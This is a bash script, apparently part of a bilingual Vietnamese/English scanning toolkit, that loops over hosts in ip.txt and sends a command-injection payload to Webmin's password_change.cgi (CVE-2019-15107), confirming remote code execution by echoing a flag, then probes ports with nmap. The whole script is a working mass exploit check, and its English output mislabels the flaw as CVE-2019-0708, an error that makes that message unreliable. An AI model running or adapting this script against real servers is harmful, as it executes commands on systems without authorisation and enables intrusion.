#!/bin/bash
######Color##########
cyan='\e[1;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
BlueF='\e[1;34m' #Biru
RESET="\033[00m" #normal
orange='\e[38;5;166m'
path=`pwd`
config_language="$path/../../../config/config-language"
source $config_language
################
file=ip.txt
while getopts ":p:s:" opt; do
	case $opt in
		p)
			rport=$OPTARG   ##LOCAL HOST PORT
		;;
		s)
			s=$OPTARG
		;;
	esac
done
  while IFS= read -r rhost
  do
	FLAG="f3a0c13c3765137bcde68572707ae5c0"
	URI=$s://$rhost:$rport;
	curl -ks $URI'/password_change.cgi' -d 'user=wheel&pam=&expired=2&old=id|echo '$FLAG'&new1=wheel&new2=wheel' -H 'Cookie: redirect=1; testing=1; sid=x; sessiontest=1;' -H "Content-Type: application/x-www-form-urlencoded" -H 'Referer: '$URI'/session_login.cgi'|grep $FLAG>/dev/null 2>&1
if [ $? -eq 0 ]; then
	if [[ "$language" = "VN" ]]; then
		echo -e "${yellow}[+]$RESET $rhost - Mục tiêu này có thể bị tấn công bởi lỗ hổng bảo mật ${red}CVE-2019-15107${RESET}."
	elif [[ "$language" = "EN" ]]; then
		echo -e "${yellow}[+]$RESET $rhost - This target could be attacked by vulnerability ${red}CVE-2019-0708${RESET}."
	fi
else
	open_check=`nmap $rhost -p $rport | grep -w open`
	service_check=`nmap $rhost -p $rport | grep -w snet-sensor-mgmt`
	if [[ "$open_check" != "" ]] && [[ "$service_check" != "" ]]; then
		if [[ "$language" = "VN" ]]; then
			echo -e "${red}[-]$RESET $rhost - Mục tiêu này đã được vá lỗi hoặc không chịu ảnh hưởng của lỗ hổng này."
		elif [[ "$language" = "EN" ]]; then
			echo -e "${red}[-]$RESET $rhost - This target has been patched or is not affected by this vulnerability."
		fi
	else
		if [[ "$language" = "VN" ]]; then
			echo -e "${red}[-]$RESET $rhost - Máy chủ này hiện không mở hoặc có thể đã đổi cổng Webmin."
		elif [[ "$language" = "EN" ]]; then
			echo -e "${red}[-]$RESET $rhost - This server is currently not running or may have changed the Webmin port."
		fi
	fi
fi
  done < $file
#EOF
